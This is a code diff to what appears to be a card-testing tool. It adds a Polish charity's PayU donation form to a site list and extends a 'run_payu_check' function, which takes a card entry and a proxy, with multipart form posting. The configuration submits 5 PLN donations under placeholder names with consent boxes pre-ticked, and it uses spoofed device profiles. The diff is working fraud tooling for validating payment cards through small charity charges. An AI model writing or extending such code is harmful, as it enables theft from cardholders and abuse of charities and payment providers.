@@ -742,6 +742,45 @@ PAYU_SITES = {
             "anonymous": "true",
         },
     },
+    "domyserca": {
+        "create_type": "ajax",
+        "create_url": "https://domyserca.pl/wp-json/contact-form-7/v1/contact-forms/691/feedback",
+        "redirect_field": "message",
+        "multipart": True,
+        "referer": "https://domyserca.pl/pomoz/",
+        "origin": "https://domyserca.pl",
+        "amount": "5",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "donation_form": {
+            "_wpcf7": "691",
+            "_wpcf7_version": "6.1.6",
+            "_wpcf7_locale": "pl_PL",
+            "_wpcf7_unit_tag": "wpcf7-f691-p71-o1",
+            "_wpcf7_container_post": "71",
+            "_wpcf7_posted_data_hash": "",
+            "volonteer": "Dzia\u0142alno\u015b\u0107 statutowa Dom\u00f3w Serca",
+            "typ": "jednorazowa wp\u0142ata",
+            "kwota": "Inna Kwota",
+            "inna_kwota": "5",
+            "data-od": "",
+            "data-do": "",
+            "firstname": "{first}",
+            "lastname": "{last}",
+            "email": "{email}",
+            "zgoda2": "1",
+            "zgoda3": "1",
+            "street": "",
+            "buildingNo": "",
+            "postcode": "",
+            "city": "",
+            "dataWpisu": "2026-10-21",
+        },
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -1049,11 +1088,20 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                 if not m:
                     raise Exception(f"ajax: nonce '{cfg['nonce_field']}' not found")
                 form[cfg["nonce_field"]] = m.group(1)
-            r = await s.post(
-                cfg["create_url"], data=form,
-                headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
-                         "Content-Type": "application/x-www-form-urlencoded",
-                         "X-Requested-With": "XMLHttpRequest"})
+            if cfg.get("multipart"):
+                from curl_cffi import CurlMime
+                mime = CurlMime()
+                for k, v in form.items():
+                    mime.addpart(k, data=str(v).encode("utf-8"))
+                r = await s.post(cfg["create_url"], multipart=mime,
+                                 headers={"Referer": cfg["referer"], "Origin": cfg["origin"]})
+                mime.close()
+            else:
+                r = await s.post(
+                    cfg["create_url"], data=form,
+                    headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                             "Content-Type": "application/x-www-form-urlencoded",
+                             "X-Requested-With": "XMLHttpRequest"})
             data = r.json()
             redirect = data
             for part in cfg.get("redirect_field", "href").split("."):
